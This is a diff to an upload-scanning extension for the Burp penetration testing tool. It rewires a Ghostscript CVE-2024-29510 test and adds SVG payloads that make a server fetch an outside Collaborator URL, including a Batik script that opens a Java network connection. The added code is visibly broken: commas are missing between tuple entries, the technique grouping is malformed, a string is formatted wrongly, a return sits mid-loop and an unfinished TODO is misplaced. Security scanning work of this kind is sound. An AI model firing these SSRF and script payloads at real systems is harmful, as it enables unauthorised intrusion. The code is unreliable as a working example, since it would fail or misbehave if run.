@@ -1965,30 +1965,36 @@ quit
             return []
         colab_tests = []
 
-        techniques += (
-            ("", "CVE-2024-29510", self._ghostscript_cve_2024_29510()),
-        )
-
         # Colab based
         for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
             for param, reference, content in techniques:
                 details = base_detail + detail_colab.format(param, reference, cmd)
                 issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                 attack = content
-                if param != "":
-                    attack = content.format(
-                        #injector.opts.image_width,
-                        #injector.opts.image_height,
-                        param,
-                        cmd,
-                        server
-                    )
-                else:
-                    attack = content.format(
-                        cmd,
-                        server
-                    )
+                attack = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    param,
+                    cmd,
+                    server
+                )
                 colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + param + cmd_name,
+                                                           attack, issue, replace=replace, redownload=True))
+            # CVE-2024-29510
+            additional_techniques = (
+                ("CVE-2024-29510", self._ghostscript_cve_2024_29510())
+            )
+            for reference, content in additional_techniques:
+                details = base_detail + detail_colab.format(reference, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                attack = content
+                attack = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    cmd,
+                    server
+                )
+                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + cmd_name,
                                                            attack, issue, replace=replace, redownload=True))
 
         return colab_tests
@@ -2868,8 +2874,48 @@ Response.write(a&c&b)
         # on https://github.com/modzero/mod0BurpUploadScanner/issues/11
 
         return colab_tests
+    def _svg_ssrf_images(self, injector, burp_colab):
+        collab_tests = []
+        if not burp_colab:
+            return collab_tests
+        techniques = (
+            ('Use', '<use xlink:href="{}ssrf.svg#foo"/>'),
+            ('Style', '<style>@import url({}style.css);</style>'),
+            ('XInclude', '<xi:include href="{}" parse="text"/>'),
+            ('Font', '<font-face font-family="cdlfont"><font-face-src><font-face-uri xlink:href="{}"/></font-face-src></font-face><text font-family="\'cdlfont\'">cdl was here</text>'),
+            ('feImage', '<filter id="externalFeImage" x="0" y="0" width="1" height="1"><feImage xlink:href="{}#ssrf"/></filter>'),
+            ('altGlyph','<text x="30" y="130"><altGlyph xlink:href="{}#ssrf"></altGlyph></text>')
+            ('tref', '<text fill="none"><tref xlink:href="{}#ssrf"/></text>'),
+            ('fill','<rect width="100" height="100" fill="url({})"></rect>')
+            ('BatikRCE', '<script type="text/ecmascript">importPackage(Packages.java.net);importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.org.apache.commons.io);var targetC = new java.net.URL("{}").openConnection();targetC.getContent();</script>')
+        )
+        if injector.opts.file_formats['svg'].isSelected():
+            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>'
+            circle = '<circle cx="50" cy="50" r="45" fill="orange" id="foo"/>'
+            # The standard file we are going to use for the tests:
+            base_svg = root_tag + '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" ' \
+                                  'xmlns:xlink="http://www.w3.org/1999/xlink" ' \
+                                  'width="{}" height="{}">{}</svg>'.format(str(injector.opts.image_width),
+                                                                      str(injector.opts.image_height),
+                                                                      circle)
+            name = "SSRF via SVG"
+            severity = "High"
+            confidence = "Certain"
+            for technique_name, payload in techniques:
+                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + technique_name
+                payload = payload.format(BurpExtender.MARKER_COLLAB_URL)
+                content = base_svg.replace(circle, payload)
+                detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an Xlink reference " \
+            "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
+            'The payload was {} . ' + \
+            "Interactions:<br><br>".format(payload)
+            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
+            collab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, content, issue,
+                                                  redownload=True))
+            return collab_tests
 
-    def _xxe_svg_external_image(self, injector, burp_colab):
+                # TODO:FINISH
+    def _xxe_svg_external_image(self, injector, burp_colab):        
         colab_tests = []
         # Burp community edition doesn't have Burp collaborator
         if not burp_colab:
